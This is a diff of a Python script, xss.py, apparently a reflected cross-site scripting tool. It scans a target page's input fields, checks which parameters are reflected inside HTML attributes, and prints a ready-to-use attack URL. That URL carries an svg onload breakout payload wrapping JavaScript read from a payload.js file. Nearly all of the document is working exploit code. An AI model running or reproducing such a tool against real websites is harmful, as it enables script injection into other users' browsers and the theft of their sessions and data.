@@ -3,6 +3,7 @@ import urllib
 import requests
 import re
 from functools import reduce
+from random import choice
 
 test = "6ix8uzz"
 headers = {
@@ -15,21 +16,20 @@ headers = {
     'Upgrade-Insecure-Requests': '1',
 }
 
-single_quote_payload = "\'><svg onload=\'init(); function init(){alert(0)}\'"
-double_quote_payload = "\"><svg onload=\'init(); function init(){alert(0)}\'"
-
-input_reg = '<input.*?name=\'(.*?)\'.*?>|<input.*?name="(.*?)".*?>'
+input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'
 
 # contexts where the test input can land in
 contexts = [
     {
         "name" : "quotes",
-        "match_str" : f'<.*?=\"({test})\".*?>|<.*?=\'({test})\'.*?>'
+        "match_str" : f'<.*=\"({test}\d*)\".*>|<.*=\'({test}\d*)\'.*>'
     }
 ]
 
 # is this the pythonic way ... idk
 payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
+single_quote_payload = f"\'><svg onload=\'{payload}\'"
+double_quote_payload = f"\"><svg onload=\'{payload}\'"
 
 if len(sys.argv) < 2:
     print("usage: python xss.py url")
@@ -41,22 +41,38 @@ if "http://" not in url:
 
 response = requests.get(url, headers=headers)
 
+# find input elements in the response and get their respective 'name' attributes
+# the assumption here is that the GET parameters submitted to the server will have
+# the same as the input names
 data = {}
-matches = re.findall(input_reg, response.text)
-for match in matches:
-    data[match[1]] = test
+params = re.findall(input_reg, response.text)
+paramid = 0
+for param in params:
+    data[param] = test + str(paramid)
+    paramid += 1
 
 test_response = requests.get(url, headers=headers, params=data)
 
 # look for test string in the response
+
+final_payloads = {}
 for line in test_response.text.split('\n'):
-    # assume ctxts are mututally exclusive 
-    injection_sites, ctx = filter(lambda x: x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
-    if ctx == "quotes":
-        double_quote, single_quote = injection_sites.group(1,2)
-        print(single_quote, double_quote)
-        payload = single_quote_payload if single_quote else double_quote_payload
-        print("payload: " + payload)
+    injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
+    # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
+    injection_site = next(injection_site, None)
+    if injection_site:
+        context, name = injection_site
+        if name == "quotes":
+            double_quote, single_quote = context.group(1,2)
+            index = single_quote[-1:] if single_quote else double_quote[-1:]
+            param_name = params[int(index)]
+            final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload
+
+# lets just use the first param
+param, payload = list(final_payloads.items())[0]
+url = url if url[-1:] == '/' else url + '/'
+url = url + "?" + param + "=" + payload
+print(url)
 
 
 
